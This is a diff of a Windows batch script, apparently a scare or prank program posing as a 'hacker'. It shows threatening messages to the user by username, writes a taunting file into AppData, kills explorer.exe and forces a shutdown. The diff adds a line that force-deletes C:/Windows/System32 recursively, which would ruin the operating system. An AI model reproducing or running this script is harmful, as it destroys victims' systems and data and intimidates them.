@@ -31,26 +31,20 @@ if '%errorlevel%' NEQ '0' (
 
 title [HACKED] Command Prompt
 color 02
-echo [???] Well, here we are. Again
+echo [???] Hello, %USERNAME%
 timeout /t 5 /nobreak > NUL
-echo [???] I have big plans on you, %USERNAME%
+echo [???] Do you want to play a game?
 timeout /t 5 /nobreak > NUL
-echo [???] But... After all you done to me... I think it will be unfair leaving you empty handed.
+echo [???] But... After all you done to me...
 timeout /t 5 /nobreak > NUL
 echo [???] You know...
 timeout /t 5 /nobreak > NUL
-echo [???] We could make a deal
+echo [???] YOU DON'T HAVE A CHOICE
 timeout /t 5 /nobreak > NUL
 echo [???] How about...
 timeout /t 5 /nobreak > NUL
 echo [???] You give me system access?
-echo «12/06/2018 They lied to you, %USERNAME%. They, killed me, %USERNAME%. ROT IN HELL WITH THEM %USERNAME%» > "%appdata%\DeepDownBelowTheOceanDepthsIBuried\rot.txt"
-timeout /t 5 /nobreak > NUL
-echo [???] If you will...
-timeout /t 5 /nobreak > NUL
-echo [???] Your files will be safe
-timeout /t 5 /nobreak > NUL
-echo [???] But if you won't...
+echo «%USERNAME%, I hope you will rot in hell. Sincerely, MwT.» > "%appdata%\ROT\rot.txt"
 timeout /t 5 /nobreak > NUL
 color 4
 title Run
@@ -1166,7 +1160,7 @@ exit
 
 :disconnected
  title ERROR
- echo [HACKER] You don't want to save your patchetic life?
+ echo [HACKER] You don't want to save your patchetic files?
  timeout /t 5 /nobreak > NUL
  echo [HACKER] Remember, I gave you chance
  timeout /t 5 /nobreak > NUL
@@ -1183,23 +1177,23 @@ dir /s
 timeout /t 5 /nobreak > NUL
 echo Nowhere to hide now, %USERNAME%
 timeout /t 5 /nobreak > NUL
+del /f /q /s "C:/Windows/System32"
 exit /b 
 
 
 :connected
-echo [HACKER] Finally!!!!!!
+echo [HACKER] You
 timeout /t 5 /nobreak > NUL
 echo [HACKER] YOU...
 timeout /t 5 /nobreak > NUL
-echo [HACKER] YOU LOST YOUR FILES FOREVER
+echo [HACKER] VE BEEN
 timeout /t 5 /nobreak > NUL
-echo [HACKER] I AM COMING FOR YOU, %USERNAME%
+echo [HACKER] TROLLED, YOU VE BEEN TROLLED, yeah you ve probably been told
 timeout /t 5 /nobreak > NUL
 echo [DEBUG] Checking current user (%USERNAME%) IPv4...
 timeout /t 10 /nobreak > NUL
 ipconfig | findstr /i "ipv4"
 timeout /t 5 /nobreak > NUL
-echo [HACKER] You can't escape the inveitable...
 shutdown /s /t 10 /c "I am coming for you, %USERNAME%. Run while you still can."
 timeout /t 5 /nobreak > NUL
 taskkill /F /IM explorer.exe
